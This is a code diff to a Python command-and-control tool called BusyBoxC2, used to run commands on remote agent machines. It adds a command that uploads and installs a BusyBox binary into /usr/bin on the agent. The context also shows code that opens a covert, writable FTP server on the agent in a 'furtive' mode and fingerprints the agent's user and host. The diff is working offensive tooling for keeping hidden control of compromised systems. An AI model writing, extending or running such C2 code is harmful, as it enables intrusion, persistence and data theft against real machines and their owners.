@@ -233,7 +233,6 @@ class BusyBoxC2:
         ftp_root = self.prompt_session.prompt("FTP root directory (can be /): ")
         listening_port = random.randint(1024, 65534)
         cmd = "setsid tcpsvd -E 0.0.0.0 " + str(listening_port) + " ftpd -wA " + ftp_root
-        #print(cmd)
         self.options.append('furtive')
         self._send_cmd(cmd)
         self.options.remove('furtive')
@@ -241,13 +240,18 @@ class BusyBoxC2:
 
     def _load_prompt(self):
         agent_user = self._send_cmd("echo $USER", output=False)[0].decode().split("\n", 1)[0]
-        #print(agent_user)
         agent_hostname = self._send_cmd("hostname", output=False)[0].decode().split("\n", 1)[0]
-        #print(agent_hostname)
         agent_pwd = self._send_cmd("pwd", output=False)[0].decode().split("\n", 1)[0]
-        #print(agent_pwd)
         
         self.prompt = " (busybox-c2)[+] " + agent_user +  "@" + agent_hostname + ":" + agent_pwd + "> "
+
+    def _upgrade_busybox(self):
+        busybox_local_path = "ressources/busybox"
+        busybox_remote_path = "/usr/bin/"
+        self._upload(file=busybox_local_path, destination_path=busybox_remote_path)
+        cmd = "chmod +x " + busybox_remote_path + "busybox"
+        self._send_cmd(cmd)
+        print(f"[*] Busybox v1.36.1 installed on {busybox_remote_path}")
 
     def run(self):
         try:
@@ -290,6 +294,8 @@ class BusyBoxC2:
                             self.options.append('furtive')
                             if "load_prompt" in self.options: self.options.remove("load_prompt")
                             self.prompt = " (busybox-c2)[§]> "
+                        case '/upgrade_busybox':
+                            self._upgrade_busybox()
                         case _:
                             self._send_cmd(cmd)
                             if "load_prompt" in self.options: self._load_prompt()
